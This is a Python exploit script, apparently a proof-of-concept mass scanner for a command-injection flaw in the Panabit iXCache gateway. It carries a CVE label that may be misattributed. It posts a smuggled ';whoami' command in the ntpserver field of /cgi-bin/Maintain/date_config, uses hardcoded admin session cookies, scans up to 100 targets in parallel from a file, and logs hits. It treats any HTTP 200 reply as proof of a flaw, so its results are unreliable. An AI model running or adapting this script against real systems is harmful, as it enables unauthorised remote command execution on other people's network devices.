#Panabit iXCache网关RCE漏洞CVE-2023-38646
#导包外置
import requests,argparse,sys
from multiprocessing.dummy import Pool
# 关闭告警
requests.packages.urllib3.disable_warnings()

def banner():
    test = """ ____  _     _____      ____  ____  ____ _____      _____  ____     _     _     _ 
/   _\/ \ |\/  __/     /_   \/  _ \/_   \\__  \     \__  \/ ___\ __/ \/\ / | __/ \
|  /  | | //|  \ _____  /   /| / \| /   /  /  |_____  /  |\ \ ///__  |\_\| |/__  |
|  \__| \// |  /_\____\/   /_| \_/|/   /_ _\  |\____\_\  |/ /_\\|\/  |   | ||\/  |
\____/\__/  \____\     \____/\____/\____//____/     /____/\____/\____/   \_|\____/
                                                            author :CHKer
                                                            version:1.0.0
  """
    print(test)

def main():
    banner()
    parser = argparse.ArgumentParser(description="Panabit iXCache网关RCE漏洞CVE-2023-38646")
    parser.add_argument('-u', '--url', dest='url', type=str, help=' input your url')
    parser.add_argument('-f', '--file', dest='file', type=str, help='input your file path')
    args = parser.parse_args()
    if args.url and not args.file:
        poc(args.url)
    elif not args.url and args.file:
        url_list = []
        with open(args.file, 'r', encoding='utf-8') as fp:
            for i in fp.readlines():
                url_list.append(i.strip().replace('\n', ''))
        mp = Pool(100)
        mp.map(poc, url_list)
        mp.close()
        mp.join()
    else:
        print(f"Usag:\n\t python {sys.argv[0]} -h")

def poc(target):
    payload = "/cgi-bin/Maintain/date_config"
    headers = {
        'Host': '127.0.0.1:8443',
        'Cookie': 'pauser_9667402_260=paonline_admin_44432_9663; pauser_9661348_661=paonline_admin_61912_96631',
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:104.0) Gecko/20100101 Firefox/104.0',
        'Content-Type': 'application/x-www-form-urlencoded',
        'Content-Length': '107',
    }
    data = "ntpserver=0.0.0.0%3Bwhoami&year=2000&month=08&day=15&hour=11&minute=34&second=53&ifname=fxp1"
    proxies = {
        'http':'http://127.0.0.1:8080',
        'https':'http://127.0.0.1:8080'
    }
    try:
        res1 = requests.get(url=target+payload,headers=headers,data=data,timeout=10,verify=False,proxies=proxies)
        if res1.status_code == 200:
            print(f"[+]该url:{target}存在漏洞")
            with open('result57.txt','a', encoding='utf-8') as fp:
                fp.write(f"{target}"+"\n")
        else:
            print(f'[-]该url:{target}不存在漏洞')
    except:
        print(f'[-]该url:{target}该站点存在问题')

if __name__ == '__main__':
    main()